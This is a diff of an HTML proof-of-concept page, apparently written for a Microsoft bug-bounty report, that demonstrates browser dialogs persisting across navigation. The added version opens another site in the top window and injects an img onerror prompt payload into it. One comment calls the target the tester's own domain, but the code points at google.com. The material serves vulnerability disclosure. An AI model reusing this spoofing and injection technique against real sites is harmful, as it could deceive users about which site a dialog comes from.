@@ -1,15 +1,31 @@
-<script>
-setTimeout(() => {
-  // Navigasi top-level
-  location.href = "https://example.com";
-}, 2000);
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MSRC PoC Demo</title>
+</head>
+<body>
+<h1>MSRC PoC Demo - Safe</h1>
+<button id="trigger">Trigger Prompt</button>
 
-// Dialog dibuat SEBELUM navigasi
-setTimeout(() => {
-  alert(
-    "Security Notice\n\n" +
-    "This dialog was created BEFORE navigation.\n" +
-    "Observe that it persists AFTER the address bar changes."
-  );
-}, 1500);
+<script>
+function showPrompt() {
+    // Buka tab baru / top-level navigation ke domain test sendiri
+    const win = window.open('https://google.com:8080', '_top');
+
+    // Delay untuk memastikan page baru sudah dimuat
+    setTimeout(function() {
+        // Inject prompt ke halaman baru
+        win.document.body.innerHTML = `
+            <h2>Demo Page</h2>
+            <img src="" onerror="prompt('💡 Demo: bug.bounty.ids dialog persistence','')">
+        `;
+    }, 150);
+}
+
+// Delay eksekusi untuk trigger setelah klik
+document.getElementById('trigger').addEventListener('click', function() {
+    setTimeout(showPrompt, 300);
+});
 </script>
+</body>
+</html>
